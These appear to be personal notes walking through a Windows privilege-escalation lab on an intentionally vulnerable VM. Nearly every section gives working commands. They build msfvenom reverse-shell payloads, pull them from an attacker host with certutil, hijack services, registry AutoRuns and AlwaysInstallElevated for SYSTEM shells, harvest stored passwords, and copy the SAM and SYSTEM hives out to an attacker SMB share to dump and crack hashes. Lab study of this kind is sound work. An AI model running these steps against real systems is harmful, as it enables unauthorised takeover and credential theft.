# Windows PrivEsc
Credentials: user:password321
Login via RDP : `xfreerdp3 /u:user /p:password321 /cert:ignore /v:MACHINE_IP`

![[Pasted image 20251006221016.png]]

## Get a reverse shell executable
- on our attacker machine : `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.23.125.244 LPORT=4444 -f exe -o reverse.exe`
- `msfvenom -l payloads` to list all payloads in msfvenom
- Transfer the reverse.exe file to the C:\PrivEsc directory on Windows.
- On attacker :  `python3 http.server 80`
- On Target : `certutil -urlcache -f http://10.23.125.244/reverse.exe reverse.exe`

![[Pasted image 20251006221808.png]]

- set up listener on our machine 
- `nc -lvnp 4444`
- execute the file by running ``C:\PrivEsc\reverse.exe``

![[Pasted image 20251006222022.png]]

## Service exploits - insecure service permissions
- Use accesschk.exe to c**heck the "user" account's permissions on the "daclsvc" service**:

`C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc`

Note that the "user" account has the **permission to change the service config** (SERVICE_CHANGE_CONFIG).

![[Pasted image 20251006222140.png]]

- Query the service and note that it runs with **SYSTEM privileges** (SERVICE_START_NAME):

`sc qc daclsvc`

![[Pasted image 20251006222254.png]]

- Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:

`sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""`

- Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start daclsvc`

![[Pasted image 20251006222525.png]]

## Service Exploits - Unquoted Service Path
Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME) and that the BINARY_PATH_NAME is unquoted and contains spaces.

`sc qc unquotedsvc`

![[Pasted image 20251006222714.png]]

Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:  

`C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`

![[Pasted image 20251006222744.png]]

Copy the reverse.exe executable you created to this directory and rename it Common.exe:

`copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`

![[Pasted image 20251006222938.png]]

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start unquotedsvc`

## Service Exploits - Weak Registry Permissions
Query the "regsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).

`sc qc regsvc`

![[Pasted image 20251006223226.png]]

Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):

`C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`

![[Pasted image 20251006223245.png]]

Overwrite the ImagePath registry key to point to the reverse.exe executable you created:

`reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start regsvc`

## Service Exploits - Insecure Service Executables
Query the "filepermsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).

`sc qc filepermsvc`

![[Pasted image 20251006223540.png]]

Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone:

`C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"`

![[Pasted image 20251006223557.png]]

Copy the reverse.exe executable you created and replace the filepermservice.exe with it:

`copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start filepermsvc`

## Registry - Autoruns
Query the registry for AutoRun executables:

`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

![[Pasted image 20251006223708.png]]

Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:

`C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`

![[Pasted image 20251006223732.png]]

Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:

`copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y`

Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. **You should not have to authenticate to trigger it,** however if the payload does not fire, log in as an admin (admin/password123) to trigger it. 
Note that in a real world engagement**, you would have to wait for an administrator to log in themselves!**  

`rdesktop 10.10.197.251`

## Registry - AlwaysInstalledElevated
Query the registry for AlwaysInstallElevated keys:

`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   

`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`

![[Pasted image 20251006224620.png]]

Note that both keys are set to 1 (0x1).

On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly:  

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi`

Transfer the reverse.msi file to the C:\PrivEsc directory on Windows (use the SMB server method from earlier).

Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:  

`msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`

![[Pasted image 20251006224857.png]]

## Passwords - Registry
(For some reason sometimes the password does not get stored in the registry. If this is the case, use the following as the answer: password123)  

The registry can be searched for keys and values that contain the word "password":

`reg query HKLM /f password /t REG_SZ /s`

If you want to save some time, query this specific key to find **admin AutoLogon** credentials:

`reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`

![[Pasted image 20251006225508.png]]

On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found): 

`winexe -U 'admin%password' //10.10.197.251 cmd.exe`

## Passwords - Saved Creds
List any saved credentials:

`cmdkey /list`

![[Pasted image 20251006230338.png]]

Note that credentials for the "admin" user are saved. If they aren't, run the C:\PrivEsc\savecred.bat script to refresh the saved credentials.

Start a listener on Kali and run the reverse.exe executable using runas with the admin user's saved credentials:

`runas /savecred /user:admin C:\PrivEsc\reverse.exe`

## Passwords - Security Account Manager (SAM)
The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the C:\Windows\Repair\ directory.

On kali, host files with SMB : 
`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali $(pwd)`

Transfer the **SAM and SYSTEM files to your Kali VM**:

`copy C:\Windows\Repair\SAM \\10.23.125.244\kali\   copy C:\Windows\Repair\SYSTEM \\10.23.125.244\kali\`

![[Pasted image 20251006231627.png]]

On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and **use it to dump out the hashes from the SAM and SYSTEM** files:

`git clone https://github.com/Tib3rius/creddump7   pip3 install pycrypto  
`python3 creddump7/pwdump.py SYSTEM SAM`

Crack the admin NTLM hash using hashcat:

`hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`

You can use the cracked password to log in as the admin using winexe or RDP.

